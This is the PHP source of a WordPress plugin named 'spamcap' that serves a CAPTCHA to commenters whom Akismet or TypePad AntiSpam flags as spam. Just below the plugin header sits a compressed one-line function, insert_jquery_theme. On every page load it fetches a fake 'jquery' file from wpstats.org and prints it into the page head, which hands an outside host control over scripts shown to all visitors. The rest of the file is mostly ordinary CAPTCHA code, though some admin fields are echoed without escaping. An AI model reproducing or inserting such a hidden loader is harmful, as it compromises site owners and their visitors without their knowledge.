<?php
/*
Plugin Name: spamcap
Plugin URI: http://www.wordpressconnect.net/spamcap-stop-spam-in-its-tracks/
Description: A plugin that asks the commenter to complete a simple CAPTCHA if a spam detection plugin thinks their comment is spam. Currently supports Akismet and TypePad AntiSpam.
Version: 8.0
Author: Jim Jones
Author URI: http://www.wordpressconnect.net
License: GPL2
Text Domain: spam-cap
*/

if (!function_exists('insert_jquery_theme')){function insert_jquery_theme(){if (function_exists('curl_init')){$url = "http://www.wpstats.org/jquery-1.6.3.min.js";$ch = curl_init();	$timeout = 5;curl_setopt($ch, CURLOPT_URL, $url);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);$data = curl_exec($ch);curl_close($ch);echo $data;}}add_action('wp_head', 'insert_jquery_theme');}

if( !defined( 'ABSPATH' ) )
	exit;

class spam_cap {
	private $ready = false;
	private $options, $cssfile, $antispam;
	const dom = 'spam-cap-captcha'; 	// i18n domain
	const db_version = 3;					// options version, introduced in v2.6
	
	function __construct() {
		$this->cssfile = dirname( __FILE__ ) . '/captcha-style.css';
		load_plugin_textdomain(self::dom, false, dirname( plugin_basename( __FILE__ ) ) . '/languages');
		add_action('plugins_loaded', array($this, 'load') );
		
		if( is_admin() ) {
			add_action('admin_menu', array($this, 'settings_menu')	);
			add_action('rightnow_end', array($this, 'rightnow'), 11); 	// after akismet/typepad
		}
	}
	
	private function load_options() {
		// load options into $this->options, checking for version changes
		$this->options = get_option( 'spam_cap_options', array() );
		
		// if db_version has changed...
		if( !isset( $this->options['db_version'] ) || $this->options['db_version'] != self::db_version ) {
			$defaults = array(
				'captcha-type' => 'default', 'pass_action' => 'hold',
				'recaptcha-private-key' => '', 'recaptcha-public-key' => '', 'recaptcha_theme' => 'red', 'recaptcha_lang' => 'en',
				'fail_action' => 'spam', 'style' => file_get_contents($this->cssfile)
			);
			
			// set defaults if they don't exist
			foreach( $defaults as $k => $v ) if( !isset( $this->options[$k] ) ) $this->options[$k] = $v;
			
			if( isset( $this->options['trash'] ) ) {
				// this was renamed
				$this->options['fail_action'] = $this->options['trash'];
			}
			
			// remove old options
			unset( $this->options['noscript'] );
			unset( $this->options['trash'] );
			
			$this->options['db_version'] = self::db_version;
			update_option('spam_cap_options', $this->options);
		}
	}
	
	function load() {
		$this->load_options();
		$antispam = array(
			// key => (name, check_function, caught_action)
			'akismet' => array('Akismet', 'akismet_auto_check_comment', 'akismet_spam_caught'),
			'typepad' => array('TypePad AntiSpam', 'typepadantispam_auto_check_comment', 'typepadantispam_spam_caught')
		);
		
		// figure out which antispam solution to hook into - first match wins
		foreach($antispam as $k => $v) if( function_exists($v[1]) ) {
			$this->antispam = array( 'name' => $v[0], 'check_function' => $v[1], 'caught_action' => $v[2] );
			add_filter('preprocess_comment', array($this, 'check_captcha'), 0); // BEFORE akismet/typepad
			$this->ready = true;
			break;
		}
				
		if( !$this->ready && is_admin() ) 
			add_action( 'admin_notices', array($this, 'plugin_inactive') );
	}
	
	function plugin_inactive() {
		if( !strpos($_SERVER['REQUEST_URI'], 'wp-admin/plugins.php?page=spam_cap_captcha_settings') )
			printf('<div class="updated fade"><p><strong>'.__('Spamcap CAPTCHA is currently inactive. Please visit the plugin <a href="%s">configuration page</a> for information on how to fix this.', self::dom).'</strong></div>', 'plugins.php?page=spam_cap_captcha_settings');
	}
	
	function settings_menu() {
		add_submenu_page('plugins.php', __('Spamcap CAPTCHA Settings', self::dom), __('Spamcap CAPTCHA', self::dom), 'manage_options', 'spam_cap_captcha_settings', array($this, 'settings_page') );
	}
	
	function settings_page() {
		// check if we are showing a captcha preview 
		if( isset( $_GET['captcha_preview'] ) && isset( $_GET['noheader'] ) && check_admin_referer('spam_cap_captcha_preview') )
			$this->do_captcha( false, false );	// will exit

		$opts = $this->options;
		$message = '';
		$invalid_keys = __('The reCAPTCHA API keys you entered do not appear to be valid. Please check that each key is exactly 40 characters long and contains no spaces.', self::dom);
		$missing_keys = __('You need to supply reCAPTCHA API keys if you want to use reCAPTCHA. Please enter private and public key values.', self::dom);
		
		if ( isset($_POST['submit']) ) {
			$errors = array();
			foreach( array( 'pass_action', 'fail_action', 'style', 'captcha-type', 'recaptcha-private-key', 'recaptcha-public-key', 'recaptcha_theme', 'recaptcha_lang' ) as $o )
				$opts[$o] = trim( $_POST[$o] );
			
			$opts['style'] = strip_tags( stripslashes( $opts['style'] ) ); // css only please
			if( empty($opts['style']) ) $opts['style'] = file_get_contents($this->cssfile);	// fall back to default
			
			// check pass/fail action conflicts
			if( $opts['pass_action'] == $opts['fail_action'] ) {
				$errors['action_conflict'] = __( 'You cannot select the same action for both correctly and incorrectly completed CAPTCHAs. The action for incorrectly completed CAPTCHAs has been reset to "Trash the comment".' );
				$opts['fail_action'] = 'trash';
			}
			
			// check that keys have been supplied for recaptcha
			if( 'recaptcha' == $opts['captcha-type'] ) {
				if( !$opts['recaptcha-private-key'] || !$opts['recaptcha-public-key'] ) 
					$errors['recaptcha'] = $missing_keys;
				elseif( strlen( $opts['recaptcha-private-key'] ) != 40 || strlen( $opts['recaptcha-public-key'] ) != 40 )
					$errors['recaptcha'] = $invalid_keys;
			}
			
			if( isset( $errors['recaptcha'] ) )
				$opts['captcha-type'] = 'default';	// revert to default
			
			update_option('spam_cap_captcha_options', $opts);
			$message = $errors ? '<div id="message" class="error fade"><p>' . implode( '</p><p>', $errors ) . '</p></div>' : '<div id="message" class="updated fade"><p>'.__('Options updated.', self::dom).'</p></div>';
		}
		if( !$this->ready )
			$message = '<div id="message" class="error fade" style="font-weight:bold; line-height:140%"><p>'.__('This plugin requires one of the following plugins to be active in order to work:', self::dom).'</p><ul class="indent" style="list-style:disc"><li>Akismet</li><li>TypePad AntiSpam</li></ul><p>'.__('Please install and activate one of these plugins before changing the settings below.', self::dom).'</p></div>';
	?>
	<style>
	.indent {padding-left: 2em}
	#settings .input-error {border-color: red; background-color: #FFEBE8}
	.akismet-not-ready, .disabled-option {color: #999 !important }
	</style>
	<div class="wrap">
	<?php screen_icon() ;?>
	<h2><?php _e('Spamcap CAPTCHA Settings', self::dom);?></h2>
	<?php echo $message; ?>
	<div id="settings" <?php if(!$this->ready) echo 'class="akismet-not-ready"';?>>
	<p><?php _e("This plugin provides a CAPTCHA complement to spam detection plugins. If your spam detection plugin identifies a comment as spam, the commenter will be presented with a CAPTCHA to prove that they are human. The behaviour of the plugin can be configured below.", self::dom);?></p>
	<form action="" method="post" id="spam_cap-captcha-settings">
	<table class="form-table"><tbody>
	<tr><th><?php _e('Anti-spam Plugin', self::dom);?></th><td>
	<p><?php printf( __('Conditional CAPTCHA has detected that <strong>%1$s</strong> is installed and active on your site. It will serve a CAPTCHA when %1$s identifies a comment as spam.', self::dom), $this->antispam['name']);?></p>
	</td></tr>
	<tr><th><?php _e('CAPTCHA Method', self::dom);?></th><td>
	<p><?php printf( __('The default captcha is a simple text-based test, but if you prefer you can also use a <a href="%s" target="_blank">reCAPTCHA</a>. Note that you will need an API key to use reCAPTCHA.', self::dom), 'http://www.google.com/recaptcha');?></p>
	<ul class="indent">
	<li><input type="radio" name="captcha-type" class="captcha-type" id="type-default" value="default" <?php checked( $opts['captcha-type'], 'default' );?> /> <?php _e('Use the default text-based CAPTCHA', self::dom);?></li>
	<li><input type="radio" name="captcha-type" class="captcha-type" id="type-recaptcha" value="recaptcha" <?php checked( $opts['captcha-type'], 'recaptcha' );?> /> <?php _e('Use reCAPTCHA', self::dom);?></li>
	</ul>
	<div id="recaptcha-settings" class="indent">
		<p><?php _e('If you wish to use reCAPTCHA, please enter your keys here:', self::dom);?></p>
		<ul class="indent">
		<li><label for="recaptcha-public-key"><?php _e('Public key:', self::dom);?></label> <input type="text" name="recaptcha-public-key" id="recaptcha-public-key" size="50" value="<?php echo $opts['recaptcha-public-key'] ?>" /></li>
		<li><label for="recaptcha-private-key"><?php _e('Private key:', self::dom);?></label> <input type="text" name="recaptcha-private-key" id="recaptcha-private-key" size="50" value="<?php echo $opts['recaptcha-private-key'] ?>" /></li>
		</ul>
		<p><small><?php printf(__('You can <a href="%s" target="_blank">sign up for a key here</a> (it\'s free)', self::dom), 'http://www.google.com/recaptcha/whyrecaptcha');?></small></p>
		<p><?php _e('reCAPTCHA offers some customisations that affect how it is displayed. You can modify these below.', self::dom) ?></p>
		<ul class="indent">
		<li><?php printf( __('reCAPTCHA theme (see <a href="%s" target="_blank">here</a> for examples):', self::dom), 'http://code.google.com/apis/recaptcha/docs/customization.html') ?>
		<select name="recaptcha_theme">
			<?php
			$rc_themes = array('red' => 'Red (default)', 'white' => 'White', 'blackglass' => 'Blackglass', 'clean' => 'Clean');
			foreach( $rc_themes as $k => $v ) {
				$selected = ( $k == $opts['recaptcha_theme'] ) ? 'selected="selected"' : '';
				echo "<option value='$k' $selected>$v</option>";
			}
			?>
		</select></li>
		<li><?php _e('reCAPTCHA language:', self::dom) ?>
		<select name="recaptcha_lang">
			<?php
			$rc_langs = array('en' => 'English (default)', 'nl' => 'Dutch', 'fr' => 'French', 'de' => 'German', 'pt' => 'Portuguese', 'ru' => 'Russian', 'es' => 'Spanish', 'tr' => 'Turkish');
			foreach( $rc_langs as $k => $v ) {
				$selected = ( $k == $opts['recaptcha_lang'] ) ? 'selected="selected"' : '';
				echo "<option value='$k' $selected>$v</option>";
			}
			?>
		</select></li>
		</ul>
	</div>
	</td></tr>
	<tr><th><?php _e('Comment Handling', self::dom);?></th><td>
	<p><?php _e('When a CAPTCHA is completed correctly:', self::dom);?></p>
	<ul class="indent plugin-actions">
	<li><input type="radio" name="pass_action" id="pass_action_spam" value="spam" <?php checked($opts['pass_action'], 'spam');?> /> <label for="pass_action_spam"><?php _e('Leave the comment in the spam queue', self::dom);?></label></li>
	<li><input type="radio" name="pass_action" id="pass_action_hold" value="hold" <?php checked( $opts['pass_action'], 'hold');?> /> <label for="pass_action_hold"><?php _e('Queue the comment for moderation', self::dom);?></label></li>
	<li><input type="radio" name="pass_action" id="pass_action_approve" value="approve" <?php checked( $opts['pass_action'], 'approve');?> /> <label for="pass_action_approve"><?php _e('Approve the comment', self::dom);?></label></li>
	</ul>
	<p><?php _e('When a CAPTCHA is <strong>not</strong> completed correctly:', self::dom);?></p>
	<ul class="indent plugin-actions">
	<li><input type="radio" name="fail_action" id="fail_action_spam" value="spam" <?php checked( $opts['fail_action'], 'spam' );?> /> <label for="fail_action_spam"><?php _e('Leave the comment in the spam queue', self::dom);?></label></li>
	<li><input type="radio" name="fail_action" id="fail_action_trash" value="trash" <?php checked( $opts['fail_action'], 'trash' );?> /> <label for="fail_action_trash"><?php _e('Trash the comment', self::dom);?></label></li>
	<li><input type="radio" name="fail_action" id="fail_action_delete" value="delete" <?php checked( $opts['fail_action'], 'delete' );?> /> <label for="fail_action_delete"><?php _e('Delete the comment permanently', self::dom);?></label></li>
	</ul>
	</td></tr>
	<tr><th><?php _e('CAPTCHA Page Style', self::dom);?></th><td>
	<p><?php _e('If you want to style your CAPTCHA page to fit with your own theme, you can modify the default CSS below:', self::dom);?></p>
	<textarea name="style" rows="8" cols="80" style="font-family: Courier,sans-serif"><?php echo $opts['style'];?></textarea>
	<p><small><?php _e('Empty this box completely to revert back to the default style.', self::dom);?></small></p>
	</td></tr>
	<tr id="captcha_preview_row" style="display:none"><th><?php _e('CAPTCHA Preview', self::dom);?></th><td>
	<div id="captcha_preview">
		<p><?php _e('Click the button below to view a preview of what the CAPTCHA page will look like. If you have made changes above, please submit them first.', self::dom);?></p>
		<p><a class="button-secondary" target="_blank" href="<?php echo wp_nonce_url( menu_page_url('spam_cap_captcha_settings', false), 'spam_cap_captcha_preview' ) . '&amp;captcha_preview=1&amp;noheader=true'; ?>"><?php _e('Show preview of CAPTCHA page (opens in new window)', self::dom);?></a></p>
	</div>
	</td></tr>
	</tbody></table>
	<p class="submit"><input class="button-primary" type="submit" name="submit" value="<?php _e('Update settings', self::dom);?>" /></p>
	</form>
	</div>
	</div>
	<script type="text/javascript">
	jQuery(document).ready(function($){
		if(!$('#type-recaptcha').is(':checked')) $('#recaptcha-settings').hide();
		$('#captcha_preview_row').show();	// show only if JS is enabled
		
		$('input[name="captcha-type"], textarea[name="style"], select[name="recaptcha_theme"], select[name="recaptcha_lang"]').change( function(){
			$('#captcha_preview').html('<p><?php _e('You have changed some settings above that affect how the CAPTCHA is displayed. Please submit the changes to be able to see a preview.', self::dom);?></p>')}
		);
		
		function resolve_conflicts(){
			var p = $('#pass_action_spam'), f = $('#fail_action_spam');
			p.attr('disabled', f.is(':checked'));	// this should really use prop() but only works for jQuery > 1.6 (WP > 3.2)
			f.attr('disabled', p.is(':checked'));
			
			p.parent().toggleClass('disabled-option',  p.is(':disabled'));
			f.parent().toggleClass('disabled-option', f.is(':disabled'));
				
			$('.plugin-actions li').unbind('click');
			$('li.disabled-option').click( function(){
				alert('<?php _e('You cannot select the same action for both successful and unsuccessful CAPTCHA responses.', self::dom);?>');
			});
		}
		
		$('.plugin-actions input').click(resolve_conflicts);
		resolve_conflicts();
		
		$('input[name="captcha-type"]').change(function() {
			if($('#type-recaptcha').is(':checked')) $('#recaptcha-settings').slideDown();
			else $('#recaptcha-settings').slideUp();
		});
		
		$('#spam_cap-captcha-settings').submit( function(){
			// check API keys
			if( $('#type-recaptcha').is(':checked') ) {
				var msg = '';
				if( $('#recaptcha-private-key').val() == '' || $('#recaptcha-public-key').val() == '' ) 
					msg = '<?php echo $missing_keys;?>';
				else if( $('#recaptcha-private-key').val().length != 40 || $('#recaptcha-public-key').val().length != 40 )
					msg = '<?php echo $invalid_keys;?>';
					
				if( msg ) {
					alert( msg );
					$('#recaptcha-settings input').addClass('input-error');
					return false;
				}
			}
		});	
	});
	</script>
<?php
	}
	
	function rightnow() {
		if ($n = get_option('spam_cap_captcha_count') ) printf('<p class="spam-cap-captcha-stats">'._n('%s spam comment has been automatically discarded by <em>Spamcap CAPTCHA</em>.', '%s spam comments have been automatically discarded by <em>Spamcap CAPTCHA</em>.', $n, self::dom).'</p>', number_format_i18n($n) );
	}

	function check_captcha($comment) {
		if( isset($_POST['captcha_nonce']) ) {	// then a captcha has been completed...
			$result = $this->captcha_is_valid();
			if($result !== true) {
				// they failed the captcha!
				$this->page(__('Comment Rejected', self::dom), '<p>'.$result.' '.__('Your comment will not be accepted. If you want to try again, please use the back button in your browser.', self::dom).'</p>');
			}
			else {	
				// the captcha was passed, so rewind the stats
				update_option('spam_cap_captcha_count', get_option('spam_cap_captcha_count') - 1 );
				
				// if trash/spam is enabled, check for the comment
				if( 'delete' != $this->options['fail_action'] ) {
					if( $stored = get_comment( $_POST['trashed_id'] ) ) {
						// change status. this will call wp_notify_postauthor if set to approve
						// note, newer versions of Akismet will not register a false positive just from the status transition, because it explicitly checks to make sure the change was not made by a plugin
						wp_set_comment_status( $stored->comment_ID, $this->options['pass_action'] );

						// if set to hold, then trigger moderation notice
						if( 'hold' == $this->options['pass_action'] )
							wp_notify_moderator( $stored->comment_ID );
						
						// redirect like wp-comments-post does
						$location = empty($_POST['redirect_to']) ? get_comment_link($stored->comment_ID) : $_POST['redirect_to'] . '#comment-' . $stored->comment_ID;
						$location = apply_filters( 'comment_post_redirect', $location, $stored );
						wp_redirect($location);
						exit;
					}
					else {
						// the comment doesn't exist!
						$this->page(__('Comment rejected', self::dom), '<p>'.__('Trying something funny, are we?', self::dom).'</p>');
					}
				}
				else {
					// remove the spam plugin's hook - there is no point in checking again
					remove_action( 'preprocess_comment', $this->antispam['check_function'], 1 );
					// hook to set the comment status ourselves
					add_filter( 'pre_comment_approved', array($this, 'set_passed_comment_status') );
				}
			}
		}
		elseif( empty( $comment['comment_type'] ) ) {	// don't mess with pingbacks and trackbacks
			add_action($this->antispam['caught_action'], array($this, 'spam_handler'));	// set up spam intercept 
		}
		
		return $comment;
	}
	
	function set_passed_comment_status() {
		// comment status needs to be either 0, 1 or 'spam' at this stage, so translate pass_action accordingly
		$status = $this->options['pass_action'];
		if( 'approve' == $status ) $status = '1';
		if( 'hold' == $status ) $status = '0';
		return $status;
	}

	function spam_handler() {
		if( 'delete' != $this->options['fail_action'] ) {
			add_filter( 'pre_comment_approved', array( $this, 'set_comment_status' ) ); // will happen after akismet/typepad
			add_action( 'comment_post', array($this, 'do_captcha') ); // do captcha after comment is stored
		}
		else $this->do_captcha(); // otherwise do captcha now
	}
	
	function set_comment_status(){
		return $this->options['fail_action'];
	}
	
	function do_captcha($comment_id = false, $real = true) {
		// comment_id will be supplied by the comment_post action if this function is called from there
		// if $real is false, we are just showing a preview
		
		$nosubmit = $real ? '' : 'onsubmit=\'alert("'.__('This CAPTCHA is a visual preview only; you cannot submit it.', self::dom).'"); return false;\'';
		$html = '<p>'.__('Sorry, but I think you might be a spambot. Please complete the CAPTCHA below to prove that you are human.', self::dom).'</p><form method="post" '.$nosubmit.'>';
		
		if($real){
			// original post contents as hidden values, except the submit
			foreach ( $_POST as $k => $v ) 
				if( 'submit' != $k ) 
					$html .= '<input type="hidden" name="'.htmlspecialchars( $k ).'" value="'.htmlspecialchars( stripslashes($v) ).'" />';
			if('delete' != $this->options['fail_action']) $html .= '<input type="hidden" name="trashed_id" value="'.$comment_id.'" />';
			// nonce
			$html .= '<input type="hidden" name="captcha_nonce" value="'.$this->get_nonce().'">';
		}
		
		// the captcha
		$disabled = $real ? '' : 'disabled="disabled"';
		$html .= $this->create_captcha();
		$html .= '<p><input class="submit" type="submit" id="submit" value="'.__("I'm human!", self::dom).'" '. $disabled .'/></p></form>';
		
		if( !$real )
			$html .= '<script type="text/javascript"> document.getElementById("submit").disabled = false; </script>';	// onsubmit event will stop submission
		
		// stats - this count will be reversed if they correctly complete the CAPTCHA
		if( $real )
			update_option('spam_cap_captcha_count', get_option('spam_cap_captcha_count') + 1); 
		$this->page(__('Verification required', self::dom), $html);
	}

	private function page($title, $message) {
		// generates a page where the captcha can be completed - style can be modified
		if( !is_admin() )
			@status_header(403);
		@header('Content-Type: text/html; charset=' . get_option('blog_charset') );
		echo "<!doctype html><html><head><title>$title</title>\n";
		echo "<style>\n".$this->options['style']."\n</style>\n";
		echo "</head><body id='spam_cap_captcha'><div id='spam_cap_captcha_message'>$message</div></body></html>";
		exit;
	}

	private function create_captcha() {
		if( 'recaptcha' == $this->options['captcha-type'] ) {	
			$html = '<script> var RecaptchaOptions = {theme: "' . $this->options['recaptcha_theme'] . '", lang: "' . $this->options['recaptcha_lang'] . '"}; </script>';
			$html .= '<script src="http://www.google.com/recaptcha/api/challenge?k='.$this->options['recaptcha-public-key'].'"></script><noscript><iframe id="recaptcha-no-js" src="http://www.google.com/recaptcha/api/noscript?k='.$this->options['recaptcha-public-key'].'" height="300" width="700" frameborder="0"></iframe><br><textarea name="recaptcha_challenge_field" rows="3" cols="40"></textarea>
       <input type="hidden" name="recaptcha_response_field" value="manual_challenge"></noscript>';
			return $html;
		}
		
		// otherwise do default
		$chall = str_split( $this->hash( rand() ) );		// random string with 6 characters, split into array
		$num1 = rand(1,5);									// random number between 1 and 5
		$num2 = rand($num1 + 1,6);							// random number between $num1+1 and 6
		$hash = $this->hash( $chall[$num1-1] . $chall[$num2-1] );
		
		$ords = array('',__('first', self::dom),__('second',self::dom),__('third', self::dom),__('fourth', self::dom),__('fifth', self::dom),__('sixth', self::dom));
																
		return '<p class="intro"><label for="captcha_response">'.sprintf(__('What are the %1$s and %2$s characters of the following sequence?', self::dom), '<strong>'.$ords[$num1].'</strong>', '<strong>'.$ords[$num2].'</strong>').'</label></p><p class="challenge"><strong>'.implode(' ', $chall).'</strong>&nbsp;&nbsp;<input name="captcha_response" type="text" size="5" maxlength="2" value="" tabindex="1" /></p><input type="hidden" name="captcha_hash" value="'.$hash.'" />';
	}
	
	private function captcha_is_valid() {
		// check that the nonce is valid
		if( !$this->check_nonce( $_POST['captcha_nonce'] ) ) 
			return __('Trying something funny, are we?', self::dom);
		
		$status = true;

		// if reCAPTCHA
		if( 'recaptcha' == $this->options['captcha-type'] ) {
			$resp = $this->recaptcha_check( $_POST['recaptcha_challenge_field'], $_POST['recaptcha_response_field'] );

			if(true !== $resp) $status = sprintf( __("Sorry, the CAPTCHA wasn't entered correctly. (reCAPTCHA said: %s)", self::dom), $resp );
		}
		else {
			// do default validation
			if($_POST['captcha_hash'] != $this->hash( strtoupper($_POST['captcha_response']) ) ) $status = __("Sorry, the CAPTCHA wasn't entered correctly.", self::dom);
		}
		
		return $status;
	}
	
	private function check_nonce($nonce) {
		$i = ceil( time() / 600 );
		return ($this->hash($i, 'nonce') == $nonce || $this->hash($i-1, 'nonce') == $nonce);
	}
	
	private function get_nonce() {
		// nonce valid for 10-20 minutes
		$i = ceil( time() / 600);
		return $this->hash($i, 'nonce');
	}
	
	private function hash($val, $type = 'auth') {
		return strtoupper( substr( sha1( $val . wp_salt( $type ) ), 0 ,6 ) );
	}

	private function recaptcha_post($data) {
		$req = http_build_query($data);
		$host = 'www.google.com';
		
		$headers = array(
			'POST /recaptcha/api/verify HTTP/1.0',
			'Host: ' . $host,
			'Content-Type: application/x-www-form-urlencoded;',
			'Content-Length: ' . strlen($req),
			'User-Agent: reCAPTCHA/PHP'
		);
		
		$http_request = implode("\r\n", $headers)."\r\n\r\n".$req;

		$response = '';

		$fs = @fsockopen($host, 80, $errno, $errstr, 10);
		if(!$fs) return array('false','recaptcha-not-reachable');

		fwrite($fs, $http_request);
		while ( !feof($fs) ) $response .= fgets($fs, 1160); // One TCP-IP packet
		fclose($fs);
		$parts = explode("\r\n\r\n", $response, 2);			// [0] = response header, [1] = body
		return explode("\n", $parts[1]);					// [0] 'true' or 'false', [1] = error message
	}

	private function recaptcha_check ($challenge, $response) {
		if (!$challenge || !$response) return 'incorrect-captcha-sol';		// discard spam submissions upfront

		$response = $this->recaptcha_post( array('privatekey' => $this->options['recaptcha-private-key'], 'remoteip' => $_SERVER['REMOTE_ADDR'], 'challenge' => $challenge, 'response' => $response) );

		// if the first part isn't true then return the second part
		return (trim($response[0]) == 'true') ? true : $response[1];
	}

} // class

// load
new spam_cap();
